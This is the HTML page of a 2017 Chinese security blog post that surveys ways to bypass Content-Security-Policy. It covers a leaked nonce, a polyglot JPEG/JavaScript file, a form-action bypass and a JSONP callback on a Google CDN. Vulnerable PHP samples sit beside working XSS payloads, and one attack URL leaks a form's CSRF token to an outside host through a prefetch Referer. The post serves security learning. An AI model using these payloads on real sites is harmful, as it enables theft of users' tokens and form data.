@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="forsigner,前端,设计,Hexo主题,前端开发,用户体验,设计,frontend,design,nodejs,JavaScript" />
+  
+
+  <meta name="description" content="CSP的全名是Content-Security-Policy，意在缓解XSS,CSRF一类的攻击。基础的CSP教程可以参考以下文章：  CSP Level 3浅析&amp;amp;简单的bypass via LoRexxar Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？ via 阿里聚安全   简单的输入输出情况12345678910111213141">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Homaebic-Know thyself">
+<meta property="og:url" content="http://hebic.me/2017/08/19/CSP绕过姿势总结（2017.3.1更新）/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="CSP的全名是Content-Security-Policy，意在缓解XSS,CSRF一类的攻击。基础的CSP教程可以参考以下文章：  CSP Level 3浅析&amp;amp;简单的bypass via LoRexxar Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？ via 阿里聚安全   简单的输入输出情况12345678910111213141">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://hebic.me/usr/uploads/2017/02/3918442669.jpg">
+<meta property="og:updated_time" content="2017-08-19T14:53:25.801Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Homaebic-Know thyself">
+<meta name="twitter:description" content="CSP的全名是Content-Security-Policy，意在缓解XSS,CSRF一类的攻击。基础的CSP教程可以参考以下文章：  CSP Level 3浅析&amp;amp;简单的bypass via LoRexxar Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？ via 阿里聚安全   简单的输入输出情况12345678910111213141">
+<meta name="twitter:image" content="http://hebic.me/usr/uploads/2017/02/3918442669.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的输入输出情况"><span class="toc-text">简单的输入输出情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#双语言Javascript-JPEG绕过CSP"><span class="toc-text">双语言Javascript/JPEG绕过CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展阅读"><span class="toc-text">扩展阅读</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用反射XSS二次注入绕过CSP-form-action限制"><span class="toc-text">利用反射XSS二次注入绕过CSP form-action限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用CDN的回调函数绕过self的CSP"><span class="toc-text">利用CDN的回调函数绕过self的CSP</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-CSP绕过姿势总结（2017.3.1更新）" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">(no title)</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.08.19</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/08/19/CSP绕过姿势总结（2017.3.1更新）/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>CSP的全名是Content-Security-Policy，意在缓解XSS,CSRF一类的攻击。基础的CSP教程可以参考以下文章：</p>
+<ul>
+<li><a href="http://lorexxar.cn/2016/08/08/ccsp/" target="_blank" rel="external">CSP Level 3浅析&amp;简单的bypass</a> via LoRexxar</li>
+<li><a href="https://www.zhihu.com/question/21979782/answer/122682029" target="_blank" rel="external">Content Security Policy (CSP) 是什么？为什么它能抵御 XSS 攻击？</a> via 阿里聚安全</li>
+</ul>
+<hr>
+<h2 id="简单的输入输出情况"><a href="#简单的输入输出情况" class="headerlink" title="简单的输入输出情况"></a>简单的输入输出情况</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;xss&lt;/title&gt;</div><div class="line">	&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=uft-8"</span> /&gt;</div><div class="line">	&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"script-src \'nonce-randcode\'"</span>;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">	&lt;form action=<span class="string">"nonces.php"</span> method=<span class="string">"post"</span>&gt;</div><div class="line">	&lt;input type=<span class="string">"text"</span> name=<span class="string">"a"</span>&gt;</div><div class="line">	&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>&gt;</div><div class="line">	&lt;/form&gt;</div><div class="line">	</div><div class="line">	<span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span>($_POST[\<span class="string">'a\']);</span></div><div class="line"><span class="string">	?&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">&lt;/body&gt;</span></div><div class="line"><span class="string">&lt;/html&gt;</span></div></pre></td></tr></table></figure>
+<p>在这种情况下，post传入的a被直接输出出来，形成xss漏洞。脚本限制需要特定的nonce，但是nonce可以被查看到，所以在这种情况下只需要post数据：<code>&lt;script nonce=\&#39;randcode\&#39;&gt;alert(1)&lt;/script&gt;</code>即可执行。</p>
+<hr>
+<h2 id="双语言Javascript-JPEG绕过CSP"><a href="#双语言Javascript-JPEG绕过CSP" class="headerlink" title="双语言Javascript/JPEG绕过CSP"></a>双语言Javascript/JPEG绕过CSP</h2><p>PortSwigger在他的博客中分享了一种修改JPEG，既能显示，又可以作为javascript执行的方法。上传JPEG之后用<code>&lt;script&gt;</code>标签加载的方式绕过CSP的不允许加载其它域脚本。</p>
+<p>原文在：<a href="http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html" target="_blank" rel="external">Bypassing CSP using polyglot JPEGs</a></p>
+<p>让我们来解读一下具体的原理。</p>
+<p>首先我们需要知道JPEG头文件的前四个字节是：<code>0XFF 0XD8 0XFF 0XE0</code>，而且他也可以作为javascript的语言结构，可以当做javascript执行而不报错，这为双语言javascript/jpeg打下基础了。第四个字节之后的两个字节是指定JPEG头部长度的字节，作者用了Javascript的注释符/*来作为这两个字节，即<code>0X2F 0X2A</code>作为头部，那么到0X2F2A的长度都要填充NULL。</p>
+<p>到现在为止头文件长成这个样子：<code>FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00 ......</code></p>
+<p>进入JPEG内容，为了javascript可以正常执行，就需要闭合头文件中的注释，并且写入xss语句，语句结束后再开启新的注释，让后面的代码不影响js的执行。</p>
+<p>最后，到文件的末尾闭合Javascript注释，还需要编辑图像数据的最后四个字节，让它符合图片格式。但是不要忘了用Javascript注释掉这这个东西，所以最后的四个字节是这样</p>
+<p><code>2F 2F FF D9</code></p>
+<p>我画了一个帮助理解的图片……（这真的可以帮助理解么）</p>
+<p><img src="http://hebic.me/usr/uploads/2017/02/3918442669.jpg" alt="解释图片.jpg"></p>
+<p>这种方法可以在Safari，Firefox，Edge，IE11上运行，Chrome聪明的不会把图片当做Javascript执行。Firefox 2017之后的版本修补了这个漏洞。</p>
+<p>最后Javascript的代码如下：</p>
+ <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script charset =\<span class="string">'ISO-8859-1\'src=\'xss.jpg\'&gt; &lt;/script&gt;</span></div></pre></td></tr></table></figure>
+<p>这里提供大小不同的已经完成修改了的图片：<br><a href="http://hebic.me/websec/xss/xss.jpg">大图片</a><br><a href="http://hebic.me/websec/xss/xss_small.jpg">小图片</a></p>
+<h3 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h3><p><a href="http://www.thinkfu.com/blog/gifjavascript-polyglots&amp;usg=ALkJrhglFwPzVXwZpAT8ilY5p-RQ1QQfLA" target="_blank" rel="external">GIF/Javascript Polyglots</a></p>
+<hr>
+<h2 id="利用反射XSS二次注入绕过CSP-form-action限制"><a href="#利用反射XSS二次注入绕过CSP-form-action限制" class="headerlink" title="利用反射XSS二次注入绕过CSP form-action限制"></a>利用反射XSS二次注入绕过CSP form-action限制</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=uft-8"</span> /&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"Default-src \'self\'"</span>;&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">	<span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">	error_reporting(E_ALL^E_NOTICE^E_WARNING);</span></div><div class="line"><span class="php">	$a = $_GET[\<span class="string">'text\'];</span></span></div><div class="line"><span class="php">	<span class="keyword">echo</span> <span class="string">"$a"</span>;<span class="comment">//这里存在反射性xss</span></span></div><div class="line"><span class="php">	<span class="meta">?&gt;</span></span></div><div class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"csp_active.php"</span> <span class="attr">id</span>=<span class="string">\</span>'<span class="attr">subscribe</span>\'&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrftoken"</span> <span class="attr">value</span>=<span class="string">"csrftokenis1234567"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>一个CSP全开（包括form-action)，存在XSS反射漏洞并有表单提交的地方，可以利用反射xss二次注入绕过CSP form-action获得表单内容，包括csrftoken。</p>
+<p>攻击代码：<code>http://localhost/secstu/xss/CSP/csp_active.php?text=&lt;input value=&quot;CLICK ME FOR POC&quot; type=&quot;submit&quot; formaction=&quot;&quot; form=&quot;subscribe&quot; formmethod=&quot;get&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;xss&quot; form=&quot;subscribe&quot; value=&quot;&lt;link rel=\&#39;prefetch\&#39; href=\&#39;http://hebic.me/websec/xss/csp/csp.php\&#39;&gt;&quot;/&gt;</code></p>
+<p>攻击代码解释：</p>
+<ol>
+<li>text变量会被输出在网页中，这是xss反射型漏洞：text变量赋值为下面代码：<br><code>&lt;input value=&quot;CLICK ME FOR POC&quot; type=&quot;submit&quot; formaction=&quot;&quot; form=&quot;subscribe&quot; formmethod=&quot;get&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;xss&quot; form=&quot;subscribe&quot; value=&quot;&lt;link rel=\&#39;prefetch\&#39; href=\&#39;http://hebic.me/websec/xss/csp/csp.php\&#39;&gt;&quot;/&gt;</code></li>
+<li>生成一个submit</li>
+<li>利用formaction覆盖原form的HTML5特性，将原本为POST传参改为GET传参，让表单中的数据进入URL</li>
+<li>用rel=prefetch的预加载方式访问可控地址，csp.php会收到带着明文表单的referer头部，至此，表单的数据被泄漏到远程地址中。</li>
+</ol>
+<hr>
+<h2 id="利用CDN的回调函数绕过self的CSP"><a href="#利用CDN的回调函数绕过self的CSP" class="headerlink" title="利用CDN的回调函数绕过self的CSP"></a>利用CDN的回调函数绕过self的CSP</h2><p>原文在：<a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22" target="_blank" rel="external">H5SC Minichallenge 3: “Sh*t, it\’s CSP!”</a></p>
+<p>github上看到这样一个挑战赛，在CSP的配置为<code>default-src \&#39;self\&#39; ajax.googleapis.com</code>并且加载了<a href="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js的情况下绕过CSP。" target="_blank" rel="external">https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js的情况下绕过CSP。</a></p>
+<p>原文中第一名提供了一种眼前一亮的思路：使用api返回json格式执行js，达到xss的目的。</p>
+<p>我将题目的核心部分复制下来<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php">header(\<span class="string">'Content-Security-Policy: default-src \\\'self\\\' ajax.googleapis.com\');</span></span></div><div class="line"><span class="php">header(\<span class="string">'Content-Type: text/html; charset=utf-8\');</span></span></div><div class="line"><span class="php">header(\<span class="string">'X-Frame-Options: deny\');</span></span></div><div class="line"><span class="php">header(\<span class="string">'X-Content-Type-Options: nosniff\');</span></span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="meta">&lt;!doctype html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Sh*t, it\'s CSP!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"&lt;?php echo $_GET[\'xss\']; ?&gt;"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">\</span>'\'&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>第一名的payload是<code>&quot;&gt;&lt;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt;&lt;/script&gt;</code></p>
+<p>显而易见的利用回调一个alert内容为1337完成挑战。返回JSON格式，被script接受到。Chrome 56.0.2924.87和Firefox 51.0.1均弹窗。</p>
+<p>另外很多答案都用到了AngularJS，自己还一点不会，看来下一步得学习这个了。</p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/08/19/74CMS_3.5 后台任意文件写入/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/08/19/Mysql操作中的条件竞争漏洞/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/08/19/CSP绕过姿势总结（2017.3.1更新）/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
